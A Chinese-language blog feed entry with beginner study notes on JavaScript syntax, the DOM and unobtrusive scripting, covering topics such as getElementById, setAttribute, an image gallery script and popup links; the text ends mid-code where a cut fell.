    <published>2021-02-28T05:10:29.000Z</published>
    <updated>2021-04-25T07:09:09.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DHTML"><a href="#DHTML" class="headerlink" title="DHTML"></a>DHTML</h2><ul><li>动态HTML<ul><li>HTML：<code>网页</code> –标记为–&gt; <code>元素</code></li><li>CSS：设计元素的<strong>排版样式</strong>以及在窗口中的<strong>显示位置</strong></li><li>JS：<strong>实时</strong>改变样式</li></ul></li></ul><p>css-js：css先静态设定样式，再由js动态改变</p><p>DHTML最终实现：DOM</p><h3 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h3><p>问题：DOM兼容性<br>解决：W3C</p><h2 id="js语法"><a href="#js语法" class="headerlink" title="js语法"></a>js语法</h2><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 嵌入html</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"># 存入独立文件，src指向</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> scr=<span class="string">&quot;file.js&quot;</span>&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 单行注释</span></span><br><span class="line"></span><br><span class="line">&lt;!- 单行 </span><br><span class="line">在html中后面还要加上-&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">跨行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>js中赋值之前无需对其做出声明，但作为良好习惯要声明</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="keyword">var</span> b,c;</span><br><span class="line"><span class="keyword">var</span> b=<span class="string">&quot;a&quot;</span>,c=<span class="number">33</span>;</span><br></pre></td></tr></table></figure><p>命名：不允许空格or除<code>$</code>外的标点</p><p>单（双）引号中的单（双）引号：转义</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>离散值</p><blockquote><p>一个变量在任何时刻都只能有<strong>一个值</strong></p></blockquote><ul><li>字面量</li><li>数值</li><li>布尔值</li></ul><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><blockquote><p><strong>一组值</strong></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">var</span> tmp2 = <span class="built_in">Array</span>(length); <span class="comment">// length = 数值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 填充</span></span><br><span class="line">tmp[<span class="number">0</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tmp3 = <span class="built_in">Array</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>); <span class="comment">// 最佳方式，指明是数组</span></span><br><span class="line"><span class="keyword">var</span> tmp4 = [<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>];</span><br></pre></td></tr></table></figure><p>填充</p><blockquote><p>向数组中添加元素的操作</p></blockquote><h4 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h4><blockquote><p>如果在填充数组时只给出元素的值，这个数组就是数值数组<br>更一般的情况：明确给出下标</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">usr[<span class="string">&quot;john&quot;</span>] = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line">usr[<span class="string">&quot;john&quot;</span>][<span class="string">&quot;age&quot;</span>] = <span class="number">18</span>;</span><br></pre></td></tr></table></figure><blockquote><p>1.关键字 所谓关键字就是已被:语言本身使用, 不能作其它用途使用的字。</p><p>2.操作符 操作符是在表达式中用于连接不同对象的运算符,不同的操作符指定了不同的运算方式。 可以把操作符理解为语言内置的,最基础的函数,不可代替的函数! </p><p>比如<code>new</code>就是操作符，<code>Array</code>就是关键字</p><hr><p>15.4.1 The Array Constructor Called as a Function</p><p>When Array is called as a function rather than as a constructor, it creates and initialises a new Array object. Thus the function call Array(…) is equivalent to the object creation expression new Array(…) with the same arguments.</p></blockquote><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id><a href="#" class="headerlink" title="+"></a>+</h4><ol><li>算术</li><li>拼接：<code>alert(&quot;a&quot;+&quot; b&quot;)</code></li></ol><ul><li>+的运算规则是：如果把数字与字符串相加，结果将成为字符串</li></ul><p>条件语句、比较操作符、逻辑操作符、循环语句同c语言</p><h4 id="vs"><a href="#vs" class="headerlink" title="+= vs =+"></a>+= vs =+</h4><ul><li><code>+=</code>：同c语言</li><li><code>=+</code>：加号看作<strong>正号</strong></li></ul><h4 id="-1"><a href="#-1" class="headerlink" title="/"></a>/</h4><ul><li><code>/</code>：结果为整数or浮点数</li><li><code>Math.ceil</code>：向上取整</li><li><code>Math.floor</code>：向下取整</li><li><code>Math.round</code>：四舍五入</li></ul><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><blockquote><p>随时可以调用的语句</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">multiply</span>(<span class="params">num1, num2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> total = num1 * num2;</span><br><span class="line">  <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数命名：驼峰</p><ul><li>从第二个单词起首字母大写：<code>convertToCircle()</code></li></ul><h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><p>在函数中使用<code>var</code>指定局部变量</p><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>一种数据集合</p><blockquote><ul><li><strong>属性</strong>是隶属于某个特定对象的<strong>变量</strong></li><li><strong>方法</strong>是只有某个特定对象才能调用的<strong>函数</strong></li></ul></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.method();</span><br><span class="line"><span class="built_in">Object</span>.property;</span><br></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><blockquote><p>对象是统称，实例是个体</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Nancy = <span class="keyword">new</span> Person;</span><br></pre></td></tr></table></figure><h4 id="内建对象"><a href="#内建对象" class="headerlink" title="内建对象"></a>内建对象</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="keyword">new</span> <span class="built_in">Array</span>()</span><br></pre></td></tr></table></figure><p>Array对象是<strong>内建</strong>的</p><ul><li>Array/Date/Math</li></ul><h4 id="宿主对象-host-object"><a href="#宿主对象-host-object" class="headerlink" title="宿主对象(host object)"></a>宿主对象(host object)</h4><blockquote><p>由浏览器提供的预定义的对象</p></blockquote><ul><li>Form\Image\Element</li></ul><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>Document Object Model 文档对象模型</p><h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><blockquote><p>windows对象对应着浏览器窗口本身，这个对象的属性与方法统称BOM</p><ul><li>windows.open</li></ul></blockquote><p>而DOM是对应于浏览器内部而言的</p><p>model:节点树</p><h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><h4 id="元素节点"><a href="#元素节点" class="headerlink" title="元素节点"></a>元素节点</h4><p>例如<code>&lt;body&gt;</code></p><h4 id="文本节点"><a href="#文本节点" class="headerlink" title="文本节点"></a>文本节点</h4><p>例如<code>&lt;p&gt;</code>节点中的<strong>文本</strong></p><h4 id="属性节点"><a href="#属性节点" class="headerlink" title="属性节点"></a>属性节点</h4><p>例如<code>&lt;p title=&quot;aaa&quot;&gt;</code>中的<code>title=&quot;aaa&quot;</code>（title属性）</p><h5 id="css层叠样式表"><a href="#css层叠样式表" class="headerlink" title="css层叠样式表"></a>css层叠样式表</h5><ul><li><code>&lt;style&gt;</code>内嵌or独立文件</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">selector&#123;</span><br><span class="line">  property:value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 继承 */</span></span><br><span class="line"><span class="comment">/* css也将文档视为节点树 */</span></span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* body内的元素也会被作用 */</span></span><br></pre></td></tr></table></figure><p>元素区分：<code>class</code>or<code>id</code></p><p>区别：不同元素class可以一样但id不能一样</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">.a&#123;</span><br><span class="line"><span class="css">  <span class="attribute">font-style</span>:italic;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="selector-tag">h2</span><span class="selector-class">.a</span>&#123;</span></span><br><span class="line"><span class="css">  <span class="attribute">font-style</span>:italic;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>id</code>属性就像一个挂钩，一头连着文档中的元素，另一头连着css样式表中的某个样式</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">#a&#123;</span><br><span class="line"><span class="css">  <span class="attribute">color</span>: <span class="number">#ccc</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="selector-id">#a</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css">  <span class="attribute">font-weight</span>:bold;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="检索元素节点"><a href="#检索元素节点" class="headerlink" title="检索元素节点"></a>检索元素节点</h4><p><code>getElementById()</code></p><ul><li><code>document.getElementById(id)</code><ul><li>返回对应对象</li></ul></li></ul><blockquote><p>Document 对象</p><p>每个载入浏览器的 HTML 文档都会成为 Document 对象</p></blockquote><p>用例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="keyword">typeof</span> <span class="built_in">document</span>.getElementById(<span class="string">&quot;a&quot;</span>));</span><br></pre></td></tr></table></figure><p><code>getElementByTagName()</code></p><ul><li><code>document.getElementByTagName(Tag)</code><ul><li>返回一个<strong>对象数组</strong></li></ul></li></ul><p>用例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;li&quot;</span>).length; i++) &#123;</span><br><span class="line">  alert(<span class="keyword">typeof</span> <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;li&quot;</span>)[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 注意length是属性不是方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shopping = <span class="built_in">document</span>.getElementById(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> items = shopping.getElementsByTagName(<span class="string">&quot;*&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; items.length; i++) &#123;</span><br><span class="line">  alert(<span class="keyword">typeof</span> items[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// length = 个数</span></span><br><span class="line"><span class="comment">// *通配符，统计一共有多少元素</span></span><br></pre></td></tr></table></figure><h4 id="查询属性"><a href="#查询属性" class="headerlink" title="查询属性"></a>查询属性</h4><p>查找<strong>属性节点</strong>的属性</p><p><code>getAttribute()</code></p><ul><li><code>Object.getAttribute(attr)</code><ul><li>注意不能用document对象</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; params.length; i++) &#123;</span><br><span class="line">  alert(params[i].getAttribute(<span class="string">&quot;title&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="设置属性"><a href="#设置属性" class="headerlink" title="设置属性"></a>设置属性</h4><p><code>Object.setAttribute(attribute, value)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; params.length; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> title_text = params[i].getAttribute(<span class="string">&quot;title&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (title_text) &#123;</span><br><span class="line">    params[i].setAttribute(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">    alert(params[i].getAttribute(<span class="string">&quot;title&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="js图片库"><a href="#js图片库" class="headerlink" title="js图片库"></a>js图片库</h2><ul><li>设置一个占位符图片</li><li>利用js将占位符图片转换为想要显示的图片</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showPic</span>(<span class="params">whichpic</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> source = whichpic.getAttribute(<span class="string">&quot;href&quot;</span>); <span class="comment">// 链接图片而非显示</span></span><br><span class="line">  <span class="keyword">var</span> placeholder = <span class="built_in">document</span>.getElementById(<span class="string">&quot;placeholder&quot;</span>);</span><br><span class="line">  placeholder.setAttribute(<span class="string">&quot;src&quot;</span>, source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="js函数的调用"><a href="#js函数的调用" class="headerlink" title="js函数的调用"></a>js函数的调用</h3><ol><li><p>引入html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;scripts/showPic.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>事件处理函数</p></li></ol><p><strong>js函数的一种</strong></p><p><code>event = javascript statement(s)</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;images/a.jpg&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;showPic(this); return false;&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span>&gt;</span>a<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="childNodes属性"><a href="#childNodes属性" class="headerlink" title="childNodes属性"></a>childNodes属性</h3><p>返回全体子元素的数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">countBodyChildren</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> body_element = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">  alert(body_element.childNodes.length);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onload = countBodyChildren;</span><br><span class="line"><span class="comment">// 在加载页时调用countBodyChildren函数</span></span><br></pre></td></tr></table></figure><p>注意这一返回的是所有类型的节点的统计（元素、属性、文本）</p><h3 id="nodeType属性"><a href="#nodeType属性" class="headerlink" title="nodeType属性"></a>nodeType属性</h3><table><thead><tr><th>节点类型</th><th>nodeType</th></tr></thead><tbody><tr><td>元素</td><td>1</td></tr><tr><td>属性</td><td>2</td></tr><tr><td>文本</td><td>3</td></tr></tbody></table><p>修改图片对应文本内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;description&quot;</span>&gt;</span>choose a pic.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showPic</span>(<span class="params">whichpic</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> source = whichpic.getAttribute(<span class="string">&quot;href&quot;</span>); <span class="comment">// 链接图片而非显示</span></span><br><span class="line">  <span class="keyword">var</span> placeholder = <span class="built_in">document</span>.getElementById(<span class="string">&quot;placeholder&quot;</span>);</span><br><span class="line">  placeholder.setAttribute(<span class="string">&quot;src&quot;</span>, source);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> text = whichpic.getAttribute(<span class="string">&quot;title&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> description = <span class="built_in">document</span>.getElementById(<span class="string">&quot;description&quot;</span>);</span><br><span class="line">  description.firstChild.nodeValue = text; <span class="comment">// 只有一个子节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>node.firstChild</code> = <code>node.childNodes[0]</code></li><li><code>node.lastChild</code> = <code>node.childNodes[node.childNodes.length-1]</code></li></ul><h2 id="Javascript-编程原则"><a href="#Javascript-编程原则" class="headerlink" title="Javascript 编程原则"></a>Javascript 编程原则</h2><blockquote><ul><li>预留退路：网页没有Javascript也能正常运行</li><li>分离JS：网页的结构和内容与JS的脚本动作分开</li><li>向后兼容：老版本浏览器不会因为JS死机</li></ul></blockquote><p>JS解释器：web浏览器</p><h3 id="预留退路"><a href="#预留退路" class="headerlink" title="预留退路"></a>预留退路</h3><p>只在必要时才选择用<strong>弹出窗口</strong></p><p>eg：</p><ul><li><code>windows.open(url, name, features)</code><ul><li><code>features</code>要少而精<br>利用BOM方法：不依赖文档内容，对文档内容也无影响</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">popUp</span>(<span class="params">winURL</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.open(winURL, <span class="string">&quot;popUp&quot;</span>, <span class="string">&quot;width=320,height=480&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="伪协议-pseudo-protocol"><a href="#伪协议-pseudo-protocol" class="headerlink" title="伪协议(pseudo protocol)"></a>伪协议(pseudo protocol)</h4><ul><li>真协议：标准化的通信协议<ul><li><code>http://</code></li><li><code>ftp://</code></li></ul></li><li>伪协议：非标准化<ul><li><code>javascript:</code>：通过一个链接来调用js函数</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:popUp(&quot;</span><span class="attr">http:</span>//<span class="attr">www.example.com</span>&quot;);&quot;&gt;</span>example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>不支持伪协议的浏览器会尝试打开但失败</li><li>支持但被禁用的会什么也不做</li></ul><h4 id="内嵌事件处理函数"><a href="#内嵌事件处理函数" class="headerlink" title="内嵌事件处理函数"></a>内嵌事件处理函数</h4><p>注意仍是js函数</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;popUp(&#x27;http://example.com&#x27;); return false;&quot;</span>&gt;</span>Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>在大多数情况下,为<strong>事件处理函数</strong>返回false,<strong>可以防止默认的事件行为</strong>.例如,默认情况下点击一个<code>&lt;a&gt;</code>元素,页面会跳转到该元素href属性指定的页.   </p><p><code>Return False</code>就相当于<strong>终止符</strong>，<code>Return True</code>就相当于执行符。   </p><p>在js中return false的作用一般是用来取消默认动作的。比如你单击一个链接除了触发你的   onclick事件（如果你指定的话）以外还要触发一个默认事件就是执行页面的跳转（<code>href</code>跳转）。所以如果你想取消对象的默认动作就可以return false，也就是只会打开onclick链接的网址</p></blockquote><p>用户禁用js同样会影响这个功能</p><p>ps:</p><blockquote><p>HTML 4 增加了使事件在浏览器中触发动作的能力，比如当用户点击元素时启动 JavaScript</p></blockquote><p>所以：</p><ul><li>第一个伪协议是用的<strong>全局属性</strong></li><li>第二个内嵌事件处理函数用的是<strong>全局事件函数</strong></li></ul><h4 id="如何预留退路"><a href="#如何预留退路" class="headerlink" title="如何预留退路"></a>如何预留退路</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;examples.com&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;popUp(&#x27;examples.com&#x27;); return false;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 注意单引号 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--精简：利用DOM--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;examples.com&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;popUp(this.href); return false;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>使其没有彻底失效</li></ul><blockquote><p>Javascript中this可以代表任何一种当前元素</p><ul><li><code>this.getAttribute(&#39;href&#39;)</code></li></ul></blockquote><h3 id="分离Javascript"><a href="#分离Javascript" class="headerlink" title="分离Javascript"></a>分离Javascript</h3><ul><li>同css一样，用class的id引入挂钩</li><li>用BOM来实现 <em>preload</em></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;examples.com&quot;</span> <span class="attr">class</span>=<span class="string">&quot;popup&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = preparelinks;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">preparelinks</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!getElementById) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">var</span> links = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; links.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (links[i].className == <span class="string">&quot;popup&quot;</span>) &#123;</span><br><span class="line">      links[i].onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        popUp(<span class="built_in">this</span>.href);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">popUp</span>(<span class="params">winURL</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.open(winURL, <span class="string">&quot;popUp&quot;</span>, <span class="string">&quot;width=320,height=480&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="向后兼容"><a href="#向后兼容" class="headerlink" title="向后兼容"></a>向后兼容</h3><p>对象检测：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!getElementById) <span class="keyword">return</span> <span 